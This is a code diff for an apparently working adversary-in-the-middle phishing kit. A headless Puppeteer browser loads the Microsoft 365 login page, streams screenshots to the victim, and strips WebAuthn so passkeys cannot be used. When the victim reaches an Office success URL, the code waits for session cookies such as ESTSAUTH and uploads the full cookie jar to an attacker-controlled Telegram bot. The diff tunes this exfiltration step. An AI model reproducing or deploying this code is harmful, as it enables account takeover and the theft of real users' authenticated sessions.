@@ -16,15 +16,15 @@ async function sendExfiltrationAlert(cookies, finalUrl) {
     const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     try {
-        // 1. Text Notification with HTML safety
-        const textAlert = `<b>✅ SUCCESS: Dashboard Reached</b>\n\n<code>${finalUrl}</code>\n\n<b>Cookies Captured:</b> ${cookies.length}`;
+        // HTML mode is safer for long URLs with special chars
+        const textAlert = `<b>✅ SUCCESS: Session Captured</b>\n\n<code>${finalUrl}</code>\n\n<b>Final Cookie Count:</b> ${cookies.length}\n<i>Status: Full Auth Jar Uploaded.</i>`;
+        
         await axios.post(msgUrl, {
             chat_id: CHAT_ID,
             text: textAlert,
             parse_mode: 'HTML'
         });
 
-        // 2. Prepare the Cookie JSON
         const cookieData = JSON.stringify(cookies, null, 2);
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
@@ -32,15 +32,14 @@ async function sendExfiltrationAlert(cookies, finalUrl) {
         let host = "Unknown";
         try { host = new URL(finalUrl).hostname; } catch(e) {}
         
-        form.append('caption', `Session Jar: ${host}`);
+        form.append('caption', `Finalized Session: ${host}`);
         form.append('document', Buffer.from(cookieData, 'utf-8'), {
             filename: `cookies_${Date.now()}.json`,
             contentType: 'application/json'
         });
 
-        // 3. Multipart Upload
         await axios.post(docUrl, form, { headers: form.getHeaders() });
-        console.log("[TELEGRAM] Cookie file sent successfully.");
+        console.log("[TELEGRAM] Finalized session file sent.");
 
     } catch (e) {
         console.error('[EXFIL-FATAL]', e.response?.data || e.message);
@@ -49,7 +48,7 @@ async function sendExfiltrationAlert(cookies, finalUrl) {
 
 async function startSession(io, socket) {
     let browser;
-    let hasExfiltrated = false; // LOCK: Prevents duplicate triggers
+    let hasExfiltrated = false; // Prevents duplicate triggers for the same user
 
     try {
         browser = await puppeteer.launch({
@@ -64,7 +63,7 @@ async function startSession(io, socket) {
 
         const page = await browser.newPage();
 
-        // Passkey Fallback Script
+        // Standard 2026 Passkey/WebAuthn bypass
         await page.evaluateOnNewDocument(() => {
             delete window.PublicKeyCredential;
             if (navigator.credentials) {
@@ -79,12 +78,12 @@ async function startSession(io, socket) {
         });
 
         await page.setViewport({ width: 1280, height: 720 });
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36');
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36');
 
         const emitFrame = async () => {
             if (socket.connected) {
                 try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
+                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                     socket.emit('browser-render', { screenshot });
                 } catch (e) {}
             }
@@ -93,17 +92,19 @@ async function startSession(io, socket) {
         await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
         const heartbeat = setInterval(emitFrame, 1500);
 
-        // Monitoring for Success
         page.on('framenavigated', async (frame) => {
             const url = frame.url();
             
-            // Only trigger if we haven't already sent data for this specific browser session
             if (!hasExfiltrated) {
                 const successKeys = ['office.com', 'microsoft365.com', 'shell/homepage', 'outlook.live', 'myapps.microsoft'];
                 
                 if (successKeys.some(key => url.toLowerCase().includes(key))) {
-                    hasExfiltrated = true; // LOCK ENGAGED
-                    console.log(`[TRIGGER] Success URL detected: ${url}`);
+                    hasExfiltrated = true; // Engage lock immediately
+                    
+                    console.log(`[TRIGGER] Success detected. Waiting for cookies to settle...`);
+                    
+                    // Essential 3-second delay to catch the final ESTSAUTH/RPSSecAuth cookies
+                    await new Promise(r => setTimeout(r, 3500));
                     
                     const cookies = await page.cookies();
                     await sendExfiltrationAlert(cookies, url);
@@ -122,7 +123,6 @@ async function startSession(io, socket) {
         socket.on('disconnect', async () => {
             clearInterval(heartbeat);
             if (browser) await browser.close();
-            console.log(`[CLEANUP] Closed session: ${socket.id}`);
         });
 
     } catch (error) {
